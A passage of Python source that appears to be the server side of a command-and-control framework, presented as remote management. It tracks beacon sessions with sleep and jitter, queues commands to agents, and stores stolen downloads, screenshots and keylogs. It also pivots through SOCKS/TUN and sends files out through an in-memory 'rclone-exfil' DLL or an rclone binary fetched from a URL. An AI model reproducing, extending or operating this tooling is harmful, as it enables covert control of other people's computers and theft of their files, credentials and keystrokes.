        """Return configured and enabled central rclone profiles."""
        profiles = load_profiles()
        store = asset_store()
        for row in store.list("rclone", include_disabled=False):
            try:
                payload = json.loads(store.read("rclone", row["name"]))
            except (AssetError, json.JSONDecodeError):
                continue
            if not isinstance(payload, dict):
                continue
            if payload.get("type"):
                profiles[str(payload.get("name") or os.path.splitext(row["name"])[0])] = payload
            else:
                profiles.update(
                    {str(name): profile for name, profile in payload.items() if isinstance(profile, dict) and profile.get("type")}
                )
        return profiles

    def rclone_config(self) -> dict[str, Any]:
        """Return operator-safe central rclone status with dynamic assets."""
        config = rclone_public_config(profiles=self.rclone_profiles())
        config["rclone_plugin"] = next(
            (item for item in list_plugin_files()
             if item.get("name", "").lower().startswith("rclone-exfil")
             and item.get("name", "").lower().endswith(".dll")),
            None,
        )
        return config

    @staticmethod
    def _format_ago(seconds):
        if seconds < 60:
            return f"{seconds}s ago"
        if seconds < 3600:
            return f"{seconds // 60}m ago"
        if seconds < 86400:
            return f"{seconds // 3600}h ago"
        return f"{seconds // 86400}d ago"

    def tty_print(self, msg="", *, ansi=True, end="\n", flush=True):
        """Stdout for CLI/logs. Under prompt_toolkit.patch_stdout, plain print() corrupts ESC (shows as '?')."""
        if self._cli_use_ptk:
            from prompt_toolkit import print_formatted_text
            if ansi:
                from prompt_toolkit.formatted_text import ANSI
                print_formatted_text(ANSI(msg), end=end)
            else:
                print_formatted_text(msg, end=end)
            if flush:
                sys.stdout.flush()
        else:
            print(msg, end=end, flush=flush)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CMD": Colors.BLUE
        }.get(level, Colors.END)
        self.tty_print(f"{Colors.DIM}[{timestamp}]{Colors.END} {color}[{level}]{Colors.END} {message}")
    
    @staticmethod
    def _load_persisted_session_configs():
        """Load sleep/jitter by session id from disk (survives server restart)."""
        configs = {}
        if not os.path.exists(SESSION_FILE):
            return configs
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                sessions_data = json.load(f)
        except (OSError, json.JSONDecodeError):
            return configs
        if not isinstance(sessions_data, dict):
            return configs
        for session_id, rec in sessions_data.items():
            if not isinstance(rec, dict):
                continue
            if "sleep_seconds" not in rec and "jitter_percent" not in rec:
                continue
            configs[session_id] = {
                "sleep_seconds": max(1, min(3600, int(rec.get("sleep_seconds", 60)))),
                "jitter_percent": max(0, min(100, int(rec.get("jitter_percent", 30)))),
            }
        return configs

    @staticmethod
    def _load_persisted_session_records() -> dict[str, dict]:
        """Load full session records from sessions.json (id → dict)."""
        if not os.path.exists(SESSION_FILE):
            return {}
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                sessions_data = json.load(f)
        except (OSError, json.JSONDecodeError):
            return {}
        if not isinstance(sessions_data, dict):
            return {}
        records: dict[str, dict] = {}
        for session_id, rec in sessions_data.items():
            sid = validate_beacon_session_id(session_id)
            if sid and isinstance(rec, dict):
                records[sid] = rec
        return records

    @staticmethod
    def _session_from_record(session_id: str, rec: dict) -> Session:
        """Rebuild a Session from sessions.json or history meta (no in-memory events)."""
        session = Session(
            session_id,
            rec.get("hostname") or "?",
            rec.get("username") or "?",
            rec.get("ip"),
        )
        for attr, key in (("first_seen", "first_seen"), ("last_seen", "last_seen")):
            raw = rec.get(key)
            if not raw:
                continue
            try:
                setattr(session, attr, datetime.fromisoformat(str(raw)))
            except (TypeError, ValueError):
                pass
        session.sleep_seconds = max(1, min(3600, int(rec.get("sleep_seconds", 60))))
        session.jitter_percent = max(0, min(100, int(rec.get("jitter_percent", 30))))
        if rec.get("work_dir") is not None:
            session.work_dir = rec.get("work_dir")
        if rec.get("os_type"):
            session.os_type = rec.get("os_type")
        workspace_id = str(rec.get("workspace_id") or "").strip()
        if valid_workspace_id(workspace_id):
            session.workspace_id = workspace_id
        session.config_synced = True
        return session

    def _history_event_count(self, session_id: str) -> int:
        events_path = self._history_events_path(session_id)
        if not os.path.isfile(events_path):
            return 0
        try:
            with open(events_path, "r", encoding="utf-8") as f:
                return sum(1 for line in f if line.strip())
        except OSError:
            return 0

    def _load_history_events_from_disk(self, session_id: str) -> list[dict]:
        """Read archived transcript lines for a session (empty if none)."""
        events_path = self._history_events_path(session_id)
        if not os.path.isfile(events_path):
            return []
        loaded: list[dict] = []
        try:
            with open(events_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        ev = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    if isinstance(ev, dict):
                        loaded.append(ev)
        except OSError:
            return []
        return loaded

    def _apply_history_meta_to_session(self, session) -> None:
        """Restore first_seen / work_dir from on-disk meta when a session reconnects."""
        meta_path = self._history_meta_path(session.id)
        if not os.path.isfile(meta_path):
            return
        try:
            with open(meta_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except (OSError, json.JSONDecodeError):
            return
        if not isinstance(meta, dict):
            return
        raw_first = meta.get("first_seen")
        if raw_first:
            try:
                session.first_seen = datetime.fromisoformat(str(raw_first))
            except (TypeError, ValueError):
                pass
        if meta.get("work_dir") is not None:
            session.work_dir = meta.get("work_dir")

    def _rehydrate_session_events_from_history(self, session) -> int:
        """Load archived events into memory after restart so live console keeps the transcript."""
        loaded = self._load_history_events_from_disk(session.id)
        if not loaded:
            return 0
        max_id = 0
        for ev in loaded[-MAX_RESULT_EVENTS:]:
            session.result_events.append(ev)
            max_id = max(max_id, int(ev.get("id") or 0))
        session._event_seq = max_id
        return len(loaded)

    def _archive_orphaned_sessions_on_startup(self) -> None:
        """Mark pre-restart sessions as ended so they appear in session history."""
        candidates: dict[str, dict] = {}
        for sid, rec in self._load_persisted_session_records().items():
            candidates[sid] = rec
        if os.path.isdir(HISTORY_DIR):
            try:
                names = os.listdir(HISTORY_DIR)
            except OSError:
                names = []
            for name in names:
                sid = validate_beacon_session_id(name)
                if not sid or sid in candidates:
                    continue
                meta_path = os.path.join(HISTORY_DIR, name, "meta.json")
                rec: dict = {}
                if os.path.isfile(meta_path):
                    try:
                        with open(meta_path, "r", encoding="utf-8") as f:
                            loaded = json.load(f)
                        if isinstance(loaded, dict):
                            rec = loaded
                    except (OSError, json.JSONDecodeError):
                        pass
                candidates[sid] = rec

        archived = 0
        for sid, rec in candidates.items():
            if sid in self.sessions:
                continue
            meta_path = self._history_meta_path(sid)
            if os.path.isfile(meta_path):
                try:
                    with open(meta_path, "r", encoding="utf-8") as f:
                        existing = json.load(f)
                    if isinstance(existing, dict) and existing.get("ended_at"):
                        self.remove_persisted_session(sid)
                        continue
                except (OSError, json.JSONDecodeError):
                    pass
            session = self._session_from_record(sid, rec)
            self._finalize_session_history(session, reason="server_restart")
            self.remove_persisted_session(sid)
            archived += 1
        if archived:
            self.log(f"Archived {archived} orphaned session(s) from before restart", "INFO")

    def _persisted_config_from_history_meta(self, session_id: str) -> dict | None:
        """Restore sleep/jitter from archived meta when sessions.json no longer has the row."""
        meta_path = self._history_meta_path(session_id)
        if not os.path.isfile(meta_path):
            return None
        try:
            with open(meta_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except (OSError, json.JSONDecodeError):
            return None
        if not isinstance(meta, dict):
            return None
        if "sleep_seconds" not in meta and "jitter_percent" not in meta:
            return None
        return {
            "sleep_seconds": max(1, min(3600, int(meta.get("sleep_seconds", 60)))),
            "jitter_percent": max(0, min(100, int(meta.get("jitter_percent", 30)))),
        }

    def remove_persisted_session(self, session_id: str) -> None:
        """Drop a session from sessions.json (live registry file, not history events)."""
        self._persisted_session_configs.pop(session_id, None)
        self._persisted_session_records.pop(session_id, None)
        if not os.path.exists(SESSION_FILE):
            return
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError):
            return
        if not isinstance(data, dict) or session_id not in data:
            return
        del data[session_id]
        try:
            with open(SESSION_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except OSError as e:
            self.log(f"Failed to remove {session_id[:8]} from sessions.json: {e}", "WARNING")

    def save_session(self, session):
        sessions_data = {}
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                sessions_data = json.load(f)
        
        sessions_data[session.id] = session.to_dict()
        self._persisted_session_records[session.id] = dict(sessions_data[session.id])
        self._persisted_session_configs[session.id] = {
            "sleep_seconds": session.sleep_seconds,
            "jitter_percent": session.jitter_percent,
        }
        
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_data, f, indent=2)
    
    def touch_session(self, session_id):
        """Update last_seen when a beacon polls or posts a result."""
        with self.session_lock:
            session = self.sessions.get(session_id)
            if session:
                session.last_seen = datetime.now()
                return True
        return False

    def get_session(self, session_id):
        with self.session_lock:
            return self.sessions.get(session_id)
    
    def find_session_by_prefix(self, prefix):
        """Find a session by ID prefix (minimum 4 characters)"""
        with self.session_lock:
            matching_sessions = []
            for session_id, session in self.sessions.items():
                if session_id.startswith(prefix):
                    matching_sessions.append((session_id, session))
            
            if len(matching_sessions) == 1:
                return matching_sessions[0][1]
            elif len(matching_sessions) > 1:
                self.tty_print(f"{Colors.YELLOW}Multiple sessions match prefix '{prefix}':{Colors.END}")
                for sid, session in matching_sessions:
                    self.tty_print(f"  {sid[:8]} - {session.username}@{session.hostname}", ansi=False)
                return None
            else:
                return None

    def resolve_session(self, session_id_or_prefix):
        """Resolve session by full id or unique prefix (4+ chars)."""
        session = self.get_session(session_id_or_prefix)
        if session:
            return session
        if len(session_id_or_prefix) >= 4:
            return self.find_session_by_prefix(session_id_or_prefix)
        return None

    def resolve_workspace_session(self, workspace_id: str, session_ref: str):
        """Resolve a session only when it belongs to the authenticated workspace."""
        if not valid_workspace_id(workspace_id):
            return None
        session = self.resolve_session(session_ref)
        if session and session.workspace_id == workspace_id:
            return session
        return None

    def workspace_sessions(self, workspace_id: str) -> list[dict]:
        """Return active sessions assigned to one workspace."""
        with self.session_lock:
            return [
                session.to_dict()
                for session in self.sessions.values()
                if session.workspace_id == workspace_id
            ]

    def workspace_candidates(self, workspace_id: str) -> list[dict]:
        """Return unassigned active sessions available for an explicit claim."""
        del workspace_id
        with self.session_lock:
            return [
                session.to_dict()
                for session in self.sessions.values()
                if not session.workspace_id
            ]

    def claim_workspace_session(self, workspace_id: str, session_ref: str):
        """Assign an unclaimed session to a workspace and persist the assignment."""
        if not valid_workspace_id(workspace_id):
            return None, "invalid_workspace"
        with self.session_lock:
            session = self.sessions.get(session_ref)
            if not session:
                matches = [
                    item for sid, item in self.sessions.items() if sid.startswith(str(session_ref))
                ]
                if len(matches) == 1:
                    session = matches[0]
            if not session:
                return None, "session_not_found"
            if session.workspace_id and session.workspace_id != workspace_id:
                return None, "session_claimed"
            session.workspace_id = workspace_id
        self.save_session(session)
        self._broadcast_sessions_async()
        return session, None

    def workspace_submit_tasks(
        self, workspace_id: str, session_id: str, channel: str, tasks: list[dict]
    ) -> bool:
        """Accept local workspace pivot tasks for the matching agent channel."""
        session = self.resolve_workspace_session(workspace_id, session_id)
        if not session or channel not in {"socks", "tun"}:
            return False
        manager = self.socks if channel == "socks" else self.tun_transport
        return manager.submit_external_tasks(session.id, tasks)

    def workspace_drain_responses(
        self, workspace_id: str, session_id: str, channel: str
    ) -> list[dict]:
        """Drain agent responses that belong to a workspace-local pivot."""
        session = self.resolve_workspace_session(workspace_id, session_id)
        if not session or channel not in {"socks", "tun"}:
            return []
        manager = self.socks if channel == "socks" else self.tun_transport
        return manager.drain_external_responses(session.id)

    def workspace_publish_event(self, session, event: dict) -> None:
        """Publish an event to the owning workspace's bounded transient queue."""
        workspace_id = getattr(session, "workspace_id", None)
        if workspace_id:
            self.workspace_events.publish(workspace_id, session.id, event)

    def note_download_queued(self, session, remote_path: str) -> None:
        """Remember remote path for the next file_upload from this session."""
        path = (remote_path or "").strip()
        if not path or not session:
            return
        with self.session_lock:
            session.pending_downloads.append(path)

    def pop_pending_download_path(self, session, filename: str) -> str:
        """Match a completed upload to a queued __DOWNLOAD__ path by basename, else FIFO."""
        basename = os.path.basename((filename or "").replace("\\", "/"))
        with self.session_lock:
            for i, remote_path in enumerate(session.pending_downloads):
                rp_base = os.path.basename(remote_path.replace("\\", "/"))
                if rp_base == basename:
                    del session.pending_downloads[i]
                    return remote_path
            if session.pending_downloads:
                return session.pending_downloads.popleft()
        return basename or filename or "unknown"

    @staticmethod
    def _make_download_entry(filepath: str, remote_path: str) -> dict:
        basename = os.path.basename(filepath)
        try:
            size = os.path.getsize(filepath)
            received_at = datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
        except OSError:
            size = 0
            received_at = datetime.now().isoformat()
        return {
            "artifact": basename,
            "remote_path": remote_path,
            "size": size,
            "received_at": received_at,
            "artifact_url": RMMServer._artifact_public_url(filepath),
        }

    def register_download_artifact(self, session, filepath: str, remote_path: str) -> None:
        """Index a completed agent download for operator listing."""
        prefix = safe_session_storage_prefix(session.id)
        basename = os.path.basename(filepath)
        if not basename.startswith(f"{prefix}_"):
            return
        entry = self._make_download_entry(filepath, remote_path)
        with self.session_lock:
            session.download_artifacts = [
                e for e in session.download_artifacts if e.get("artifact") != basename
            ]
            session.download_artifacts.append(entry)
            session.download_artifacts.sort(
                key=lambda e: e.get("received_at") or "", reverse=True
            )

    def backfill_download_artifacts(self, session) -> None:
        """Scan RMM_logs/downloads for files belonging to this session."""
        if self.storage_mode == "workspace":
            return
        prefix = safe_session_storage_prefix(session.id)
        downloads_dir = os.path.join(LOG_DIR, "downloads")
        if not os.path.isdir(downloads_dir):
            return
        pattern_prefix = f"{prefix}_"
        with self.session_lock:
            known = {e.get("artifact") for e in session.download_artifacts}
        try:
            names = sorted(os.listdir(downloads_dir))
        except OSError:
            return
        for name in names:
            if not name.startswith(pattern_prefix) or name.endswith(".part"):
                continue
            if name in known:
                continue
            try:
                path = safe_join_under(downloads_dir, name)
            except ValueError:
                continue
            if not os.path.isfile(path):
                continue
            stored_name = name[len(pattern_prefix) :]
            self.register_download_artifact(session, path, stored_name)

    def list_session_downloads(self, session_id_or_prefix):
        """Return download index rows for a session, or None if not found."""
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None
        if self.storage_mode == "workspace":
            return []
        self.backfill_download_artifacts(session)
        prefix = safe_session_storage_prefix(session.id)
        with self.session_lock:
            rows = [
                dict(e)
                for e in session.download_artifacts
                if str(e.get("artifact", "")).startswith(f"{prefix}_")
            ]
        rows.sort(key=lambda e: e.get("received_at") or "", reverse=True)
        return rows

    def _artifact_session_metadata(self, workspace_id: str | None = None) -> dict[str, dict[str, Any]]:
        """Build an artifact-prefix index for active and archived sessions."""
        records: dict[str, dict[str, Any]] = {}
        with self.session_lock:
            active = list(self.sessions.values())
        for session in active:
            if workspace_id and getattr(session, "workspace_id", None) != workspace_id:
                continue
            record = session.to_dict()
            record["session_id"] = session.id
            record["active"] = True
            records[safe_session_storage_prefix(session.id)] = record
        for record in self.list_session_history():
            session_id = str(record.get("session_id") or record.get("id") or "")
            if not session_id or (workspace_id and record.get("workspace_id") != workspace_id):
                continue
            records.setdefault(safe_session_storage_prefix(session_id), record)
        return records

    def list_artifacts(self, kind: str, workspace_id: str | None = None) -> list[dict[str, Any]]:
        """List downloaded files or screenshots across the operator's agents."""
        if kind not in {"downloads", "screenshots"}:
            raise ValueError("artifact kind must be downloads or screenshots")
        if self.storage_mode == "workspace":
            return []

        metadata = self._artifact_session_metadata(workspace_id)
        download_index: dict[str, dict[str, Any]] = {}
        if kind == "downloads":
            with self.session_lock:
                active = list(self.sessions.values())
            for session in active:
                if workspace_id and getattr(session, "workspace_id", None) != workspace_id:
                    continue
                self.backfill_download_artifacts(session)
                with self.session_lock:
                    entries = list(session.download_artifacts)
                for entry in entries:
                    artifact = str(entry.get("artifact") or "")
                    if artifact:
                        download_index[artifact] = entry

        directory = os.path.join(LOG_DIR, kind)
        try:
            names = sorted(os.listdir(directory))
        except OSError:
            return []
        rows: list[dict[str, Any]] = []
        for name in names:
            if name.endswith(".part"):
                continue
            try:
                safe_name = safe_storage_filename(name, "")
                path = safe_join_under(directory, safe_name)
            except ValueError:
                continue
            if not safe_name or not os.path.isfile(path):
                continue
            prefix = safe_name.split("_", 1)[0]
            session = metadata.get(prefix, {})
            if workspace_id and not session:
                continue
            indexed = download_index.get(safe_name, {}) if kind == "downloads" else {}
            try:
                size = os.path.getsize(path)
                received_at = datetime.fromtimestamp(os.path.getmtime(path)).isoformat()
            except OSError:
                size = 0
                received_at = datetime.now().isoformat()
            session_id = str(session.get("session_id") or session.get("id") or "") or None
            hostname = str(session.get("hostname") or "?")
            username = str(session.get("username") or "?")
            rows.append(
                {
                    "kind": kind,
                    "artifact": safe_name,
                    "remote_path": str(indexed.get("remote_path") or "") if kind == "downloads" else "",
                    "size": size,
                    "received_at": str(indexed.get("received_at") or received_at),
                    "artifact_url": f"{API_PREFIX}/artifacts/{kind}/{urllib.parse.quote(safe_name)}",
                    "session_id": session_id,
                    "hostname": hostname,
                    "username": username,
                    "agent_label": f"{username}@{hostname}",
                    "active": bool(session.get("active", False)),
                }
            )
        rows.sort(key=lambda row: row.get("received_at") or "", reverse=True)
        return rows

    def queue_agent_download(self, session, remote_path: str) -> str:
        """Queue __DOWNLOAD__ on the agent and track the remote path."""
        cmd = f"__DOWNLOAD__ {remote_path}"
        self.set_command(session.id, cmd, "oneshot")
        self.note_download_queued(session, remote_path)
        return cmd

    def queue_workspace_exfil(
        self,
        session,
        workspace_job: dict,
        mode: str = "auto",
    ) -> str:
        """Queue an exfil job assembled by the session's operator workspace."""
        if self.storage_mode != "workspace" or not getattr(session, "workspace_id", None):
            raise RcloneConfigError("workspace rclone jobs require workspace storage mode")
        if not isinstance(workspace_job, dict):
            raise RcloneConfigError("workspace rclone job is missing")
        mode = (mode or "auto").strip().lower()
        if mode not in {"auto", "plugin", "binary"}:
            raise ValueError("exfil mode must be auto, plugin, or binary")

        plugin_name = next(
            (item["name"] for item in list_plugin_files(getattr(session, "workspace_id", None))
             if item.get("name", "").lower().startswith("rclone-exfil")
             and item.get("name", "").lower().endswith(".dll")),
            None,
        )
        plugin_ready = bool(plugin_name and session.agent_type == "go" and "pe" in session.capabilities)
        if mode in {"auto", "plugin"} and plugin_ready:
            plugin_job = workspace_job.get("plugin_job")
            if not isinstance(plugin_job, dict) or str(plugin_job.get("source") or "").strip() == "":
                raise RcloneConfigError("workspace plugin job is missing")
            if not isinstance(plugin_job.get("settings"), dict) or not plugin_job.get("backend"):
                raise RcloneConfigError("workspace plugin job is invalid")
            cmd = f"__PE_LOAD__ {plugin_name} Run {json.dumps(plugin_job, separators=(',', ':'))}"
            self.set_command(session.id, cmd, "oneshot")
            return cmd
        if mode == "plugin":
            raise ValueError("rclone plugin unavailable for this agent or server")

        payload = workspace_job.get("binary_payload")
        if not isinstance(payload, dict) or not str(payload.get("local_path") or "").strip():
            raise RcloneConfigError("workspace binary exfil payload is missing")
        if not rclone_binary_available():
            raise ValueError(
                f"rclone binary not found — place rclone.exe at {RCLONE_BIN_PATH} "
                "or set RMM_RCLONE_BIN on the central control plane"
            )
        payload = dict(payload)
        payload["rclone_url"] = RCLONE_TOOLS_URL
        cmd = build_exfil_command_from_payload(payload)
        self.set_command(session.id, cmd, "oneshot")
        return cmd

    def queue_agent_exfil(
        self,
        session,
        remote_path: str,
        profile_name: str,
        dest: str | None = None,
        mode: str = "auto",
        workspace_job: dict | None = None,
    ) -> str:
        """Queue exfil using the selected plugin or binary execution mode."""
        mode = (mode or "auto").strip().lower()
        if mode not in {"auto", "plugin", "binary"}:
            raise ValueError("exfil mode must be auto, plugin, or binary")
        if self.storage_mode == "workspace":
            if workspace_job is None:
                raise RcloneConfigError(
                    "workspace rclone configuration must be loaded by the operator workspace"
                )
            return self.queue_workspace_exfil(session, workspace_job, mode=mode)
        plugin_name = next(
            (item["name"] for item in list_plugin_files(getattr(session, "workspace_id", None))
             if item.get("name", "").lower().startswith("rclone-exfil")
             and item.get("name", "").lower().endswith(".dll")),
            None,
        )
        plugin_ready = bool(plugin_name and session.agent_type == "go" and "pe" in session.capabilities)
        if mode in {"auto", "plugin"} and plugin_ready:
            plugin_job = build_plugin_exfil_job(
                remote_path,
                profile_name,
                dest=dest,
                profiles=self.rclone_profiles(),
                max_bytes=get_rclone_max_bytes(),
            )
            cmd = f"__PE_LOAD__ {plugin_name} Run {json.dumps(plugin_job, separators=(',', ':'))}"
            self.set_command(session.id, cmd, "oneshot")
            return cmd
        if mode == "plugin":
            raise ValueError("rclone plugin unavailable for this agent or server")
        """Queue __EXFIL__ on the agent (rclone upload from agent host)."""
        if not rclone_binary_available():
            raise ValueError(
                f"rclone binary not found — place rclone.exe at {RCLONE_BIN_PATH} "
                "or set RMM_RCLONE_BIN"
            )
        payload = build_exfil_payload(
            remote_path,
            profile_name,
            dest=dest,
            profiles=self.rclone_profiles(),
            max_bytes=get_rclone_max_bytes(),
        )
        cmd = build_exfil_command_from_payload(payload)
        self.set_command(session.id, cmd, "oneshot")
        return cmd

    def _history_meta_path(self, session_id: str) -> str:
        return os.path.join(_history_session_dir(session_id), "meta.json")

    def _history_events_path(self, session_id: str) -> str:
        return os.path.join(_history_session_dir(session_id), "events.jsonl")

    def _ai_chat_path(self, session_id: str) -> str:
        return os.path.join(_history_session_dir(session_id), "ai_chat.json")

    @staticmethod
    def _normalize_ai_chat_messages(messages) -> list[dict]:
        if not isinstance(messages, list):
            return []
        out: list[dict] = []
        for m in messages:
            if not isinstance(m, dict):
                continue
            role = m.get("role")
            content = m.get("content")
            if role not in ("user", "assistant") or not isinstance(content, str):
                continue
            row: dict = {"role": role, "content": content}
            tool_calls = m.get("tool_calls_made")
            if not isinstance(tool_calls, list):
                tool_calls = m.get("toolCalls")
            if isinstance(tool_calls, list) and tool_calls:
                row["tool_calls_made"] = tool_calls
            out.append(row)
            if len(out) >= MAX_AI_CHAT_MESSAGES:
                break
        return out

    def get_ai_chat(self, session_id_or_prefix: str) -> tuple[str | None, list[dict] | None]:
        """Load persisted AI chat for a live or archived session."""
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return None, None
        if self.storage_mode == "workspace":
            return session_id, []
        path = self._ai_chat_path(session_id)
        if not os.path.isfile(path):
            return session_id, []
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError) as e:
            self.log(f"AI chat read failed for {session_id[:8]}: {e}", "WARNING")
            return session_id, []
        messages = data.get("messages") if isinstance(data, dict) else []
        return session_id, self._normalize_ai_chat_messages(messages)

    def save_ai_chat(self, session_id: str, messages: list[dict]) -> None:
        """Persist AI chat under RMM_logs/history/{session_id}/ai_chat.json."""
        if self.storage_mode == "workspace":
            return
        sid = validate_beacon_session_id(session_id)
        if not sid:
            return
        normalized = self._normalize_ai_chat_messages(messages)
        if len(normalized) > MAX_AI_CHAT_MESSAGES:
            normalized = normalized[-MAX_AI_CHAT_MESSAGES:]
        try:
            session_dir = _history_session_dir(sid)
        except ValueError:
            return
        os.makedirs(session_dir, exist_ok=True)
        payload = {
            "updated_at": datetime.now().isoformat(),
            "messages": normalized,
        }
        try:
            with open(self._ai_chat_path(sid), "w", encoding="utf-8") as f:
                json.dump(payload, f, ensure_ascii=False, indent=2)
        except OSError as e:
            self.log(f"AI chat write failed for {sid[:8]}: {e}", "WARNING")

    def clear_ai_chat(self, session_id: str) -> bool:
        """Remove persisted AI chat for a session (no-op if missing)."""
        sid = validate_beacon_session_id(session_id)
        if not sid:
            return False
        if self.storage_mode == "workspace":
            return True
        try:
            path = self._ai_chat_path(sid)
        except ValueError:
            return False
        if not os.path.isfile(path):
            return True
        try:
            os.remove(path)
            return True
        except OSError as e:
            self.log(f"AI chat delete failed for {sid[:8]}: {e}", "WARNING")
            return False

    def _history_write_meta(
        self,
        session,
        *,
        ended: bool = False,
        end_reason: str | None = None,
    ) -> None:
        if self.storage_mode == "workspace":
            return
        try:
            session_dir = _history_session_dir(session.id)
        except ValueError:
            return
        os.makedirs(session_dir, exist_ok=True)
        meta = session.to_dict()
        meta["session_id"] = session.id
        meta["updated_at"] = datetime.now().isoformat()
        meta["active"] = session.id in self.sessions and not ended
        if ended:
            meta["ended_at"] = datetime.now().isoformat()
            meta["end_reason"] = end_reason or "ended"
        else:
            meta["ended_at"] = None
            meta["end_reason"] = None
        if session.result_events:
            meta["event_count"] = len(session.result_events)
        else:
            meta["event_count"] = self._history_event_count(session.id)
        try:
            with open(self._history_meta_path(session.id), "w", encoding="utf-8") as f:
                json.dump(meta, f, indent=2)
        except OSError as e:
            self.log(f"History meta write failed for {session.id[:8]}: {e}", "WARNING")

    def _history_append_event(self, session, ev: dict) -> None:
        if self.storage_mode == "workspace":
            return
        try:
            session_dir = _history_session_dir(session.id)
        except ValueError:
            return
        os.makedirs(session_dir, exist_ok=True)
        line = json.dumps(_event_for_history(ev), ensure_ascii=False)
        try:
            with open(self._history_events_path(session.id), "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError as e:
            self.log(f"History event append failed for {session.id[:8]}: {e}", "WARNING")

    def _finalize_session_history(self, session, reason: str = "killed") -> None:
        if self.storage_mode == "workspace":
            return
        self._history_write_meta(session, ended=True, end_reason=reason)

    def resolve_history_session_id(self, session_id_or_prefix: str) -> str | None:
        session = self.resolve_session(session_id_or_prefix)
        if session:
            return session.id
        if len(session_id_or_prefix) >= 4:
            matches = []
            if os.path.isdir(HISTORY_DIR):
                for name in os.listdir(HISTORY_DIR):
                    if name.startswith(session_id_or_prefix):
                        sid = validate_beacon_session_id(name)
                        if sid:
                            matches.append(sid)
            if len(matches) == 1:
                return matches[0]
        return validate_beacon_session_id(session_id_or_prefix)

    def list_session_history(self) -> list[dict]:
        if self.storage_mode == "workspace":
            return []
        rows = []
        active_ids = set(self.sessions.keys())
        if not os.path.isdir(HISTORY_DIR):
            return rows
        try:
            names = os.listdir(HISTORY_DIR)
        except OSError:
            return rows
        for name in names:
            sid = validate_beacon_session_id(name)
            if not sid:
                continue
            meta_path = os.path.join(HISTORY_DIR, name, "meta.json")
            if not os.path.isfile(meta_path):
                continue
            try:
                with open(meta_path, "r", encoding="utf-8") as f:
                    meta = json.load(f)
            except (OSError, json.JSONDecodeError):
                continue
            if not isinstance(meta, dict):
                continue
            meta["session_id"] = sid
            meta["active"] = sid in active_ids and not meta.get("ended_at")
            rows.append(meta)
        rows.sort(
            key=lambda r: r.get("ended_at") or r.get("updated_at") or r.get("last_seen") or "",
            reverse=True,
        )
        return rows

    def get_history_events(self, session_id_or_prefix, since_id: int = 0, limit: int = 500):
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return None, None
        events_path = self._history_events_path(session_id)
        if not os.path.isfile(events_path):
            live = self.get_session(session_id)
            if live:
                with self.session_lock:
                    events = [e for e in live.result_events if e["id"] > since_id]
                if limit > 0:
                    events = events[-limit:]
                return session_id, events
            return session_id, []
        events = []
        try:
            with open(events_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        ev = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    if isinstance(ev, dict) and ev.get("id", 0) > since_id:
                        events.append(ev)
        except OSError:
            return session_id, None
        if limit > 0:
            events = events[-limit:]
        return session_id, events

    def get_history_meta(self, session_id_or_prefix):
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return None
        meta_path = self._history_meta_path(session_id)
        if not os.path.isfile(meta_path):
            live = self.get_session(session_id)
            if live:
                meta = live.to_dict()
                meta["session_id"] = session_id
                meta["active"] = True
                return meta
            return None
        try:
            with open(meta_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except (OSError, json.JSONDecodeError):
            return None
        if isinstance(meta, dict):
            meta["session_id"] = session_id
            meta["active"] = session_id in self.sessions and not meta.get("ended_at")
        return meta

    def purge_session_artifacts(self, session_id: str) -> dict[str, int]:
        """Remove downloads, screenshots, keylogs, and .part staging files for a session."""
        sid = validate_beacon_session_id(session_id)
        counts = {"downloads": 0, "screenshots": 0, "keylogs": 0, "staging": 0}
        if not sid:
            return counts
        if self.storage_mode == "workspace":
            return counts
        prefix = safe_session_storage_prefix(sid)
        pattern_prefix = f"{prefix}_"
        for subdir in ("downloads", "screenshots", "keylogs"):
            dir_path = os.path.join(LOG_DIR, subdir)
            if not os.path.isdir(dir_path):
                continue
            try:
                names = os.listdir(dir_path)
            except OSError:
                continue
            for name in names:
                if not name.startswith(pattern_prefix):
                    continue
                try:
                    path = safe_join_under(dir_path, name)
                except ValueError:
                    continue
                if not os.path.isfile(path):
                    continue
                try:
                    os.remove(path)
                except OSError as e:
                    self.log(f"Artifact delete failed {name}: {e}", "WARNING")
                    continue
                if subdir == "downloads" and name.endswith(".part"):
                    counts["staging"] += 1
                else:
                    counts[subdir] += 1
        with self.session_lock:
            live = self.sessions.get(sid)
            if live:
                live.download_artifacts = []
                live.pending_downloads.clear()
        return counts

    def delete_history_session(
        self, session_id_or_prefix: str
    ) -> tuple[bool, str | None, str | None, dict[str, int] | None]:
        """Remove an archived transcript directory from disk.

        Returns (ok, session_id, error_code, artifacts_purged). error_code is set when ok is False
        (e.g. session_still_active, history_not_found).
        """
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return False, None, "history_not_found", None
        meta = self.get_history_meta(session_id)
        if not meta:
            return False, None, "history_not_found", None
        if meta.get("active"):
            return False, None, "session_still_active", None
        try:
            session_dir = _history_session_dir(session_id)
        except ValueError:
            return False, None, "history_not_found", None
        if not os.path.isdir(session_dir):
            return False, None, "history_not_found", None
